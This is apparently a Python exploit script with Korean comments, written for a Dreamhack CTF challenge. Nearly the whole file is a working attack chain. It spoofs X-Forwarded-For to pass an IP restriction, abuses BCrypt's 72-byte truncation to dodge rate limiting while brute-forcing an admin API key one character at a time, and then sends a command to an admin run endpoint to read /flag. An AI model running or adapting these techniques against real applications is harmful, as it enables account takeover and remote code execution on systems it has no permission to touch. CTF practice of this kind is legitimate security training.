import requests
import sys

# 타겟 서버의 IP/PORT에 맞게 수정해주세요.
TARGET_URL = "http://host3.dreamhack.games:20131"

# 세션 유지를 위한 requests.Session 객체 생성
session = requests.Session()

# [1] SecurityConfig 우회를 위한 IP 변조 헤더
headers = {
    "X-Forwarded-For": "127.0.0.1",
    "Content-Type": "application/json"
}

# 공격용 계정 정보 세팅
USERNAME = "hacker"
# [2] BCrypt 72바이트 짤림 취약점을 노린 베이스 비밀번호 세팅
BASE_PASSWORD = "A" * 72 

print("="*60)
print("[*] Dreamhack CTF - Admin Feature Exploit 시작")
print(f"[*] 타겟 URL: {TARGET_URL}")
print("="*60)

# =====================================================================
# 1단계: 72바이트 비밀번호로 회원가입
# =====================================================================
print("\n[STEP 1] 공격용 계정 회원가입 진행...")
register_url = f"{TARGET_URL}/user/register"
register_data = {"username": USERNAME, "password": BASE_PASSWORD}

print(f"  -> POST {register_url}")
print(f"  -> Payload: {register_data}")

try:
    res = session.post(register_url, json=register_data, headers=headers)
    print(f"  <- Status Code: {res.status_code}")
    print(f"  <- Response: {res.text}")
    if res.status_code not in [200, 400]: # 400은 이미 가입된 경우일 수 있음
        print("[!] 예상치 못한 응답입니다. 계속 진행합니다.")
except Exception as e:
    print(f"[!] 통신 에러 발생: {e}")
    sys.exit(1)


# =====================================================================
# 2단계: 로그인 및 세션 획득
# =====================================================================
print("\n[STEP 2] 로그인하여 세션 획득 진행...")
login_url = f"{TARGET_URL}/user/login"
login_data = {"username": USERNAME, "password": BASE_PASSWORD}

print(f"  -> POST {login_url}")
print(f"  -> Payload: {login_data}")

res = session.post(login_url, json=login_data, headers=headers)
print(f"  <- Status Code: {res.status_code}")
print(f"  <- Response: {res.text}")
print(f"  [*] 발급된 세션 쿠키: {session.cookies.get_dict()}")

if res.status_code != 200:
    print("[!] 로그인 실패! 공격을 중단합니다.")
    sys.exit(1)


# =====================================================================
# 3단계: 관리자 API Key Blind Brute-force (Rate Limit 우회)
# =====================================================================
print("\n[STEP 3] ADMIN API Key 브루트포싱 시작 (뒤에서부터 한 글자씩)...")
search_url = f"{TARGET_URL}/admin/search"
hex_chars = "0123456789abcdef"
found_api_key = ""
attempt_count = 0

# API 키는 무작위 32바이트(64자리 16진수)
for position in range(1, 65):
    print(f"\n[*] {position}/64 번째 글자 탐색 중...")
    
    char_found = False
    for char in hex_chars:
        attempt_count += 1
        guess_key = char + found_api_key
        
        # 핵심 우회 트리거: 비밀번호 뒤에 무작위 문자열(카운터)을 붙여 SHA-256 해시를 변경.
        # BCrypt는 앞 72바이트("A"*72)만 보므로 인증은 무조건 통과됨.
        bypass_password = BASE_PASSWORD + str(attempt_count)
        
        payload = {
            "apiKey": guess_key,
            "password": bypass_password
        }
        
        # 너무 많은 출력으로 화면이 가려지는 것을 막으려면 아래 프린트는 주석 처리하셔도 됩니다.
        print(f"  -> [시도 {attempt_count}] 검사 키: {guess_key} | Rate Limit 우회 패스워드 길이: {len(bypass_password)}")
        
        res = session.post(search_url, json=payload, headers=headers)
        
        if res.status_code == 200:
            res_json = res.json()
            # 응답이 ADMIN인지 확인
            if res_json.get("message") == "ADMIN":
                print(f"  [+] 일치하는 문자 발견! '{char}'")
                print(f"  [+] 현재까지 찾은 API Key 접미사: {guess_key}")
                found_api_key = guess_key
                char_found = True
                break
        elif res.status_code == 429:
            print(f"  [!] Rate Limit (429) 에러 발생! 우회 로직 점검 필요.")
            print(f"  <- Response: {res.text}")
            sys.exit(1)
        elif res.status_code != 404:
            print(f"  [?] 알 수 없는 응답 코드: {res.status_code}")
            print(f"  <- Response: {res.text}")

    if not char_found:
        print("\n[!] 매칭되는 글자를 찾지 못했습니다. 로직에 문제가 발생했습니다.")
        sys.exit(1)

print("\n" + "="*60)
print(f"[+] 최종 관리자 API Key 탈취 성공: {found_api_key}")
print("="*60)


# =====================================================================
# 4단계: Command Injection (RCE) 수행 및 플래그 획득
# =====================================================================
if len(found_api_key) == 64:
    print("\n[STEP 4] 원격 코드 실행(RCE) 및 플래그 파일 읽기 시도...")
    run_url = f"{TARGET_URL}/admin/run"
    target_command = "cat /flag"
    
    # 헤더에 찾아낸 API 키 추가
    rce_headers = headers.copy()
    rce_headers["X-Api-Key"] = found_api_key
    
    print(f"  -> POST {run_url}?cmd={target_command}")
    print(f"  -> Headers: {rce_headers}")
    
    res = session.post(run_url, params={"cmd": target_command}, headers=rce_headers)
    print(f"  <- Status Code: {res.status_code}")
    
    try:
        flag_output = res.json().get("message")
        print("\n🎉🎉🎉 [SUCCESS! FLAG ACQUIRED] 🎉🎉🎉")
        print(f"  >> {flag_output}")
    except Exception as e:
        print(f"  [!] 응답 파싱 실패. Raw 응답을 확인하세요: {res.text}")
else:
    print("\n[!] API Key가 완전하지 않아 RCE 단계를 건너뜁니다.")

print("\n[*] 익스플로잇 종료.")